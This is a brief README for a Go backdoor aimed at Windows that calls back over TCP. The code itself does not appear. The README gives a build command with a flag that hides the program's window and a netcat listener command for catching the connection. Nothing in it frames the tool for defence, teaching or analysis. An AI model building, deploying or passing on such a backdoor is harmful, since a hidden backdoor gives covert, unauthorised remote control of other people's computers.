# go-basic-backdoor

This is a basic golang backdoor for windows over tcp in 24 line 

# Compilation
```
go build -ldflags -H=windowsgui backdoor.go
```
# Start netcat listener
```
nc -L 0.0.0.0 -p 7777
```
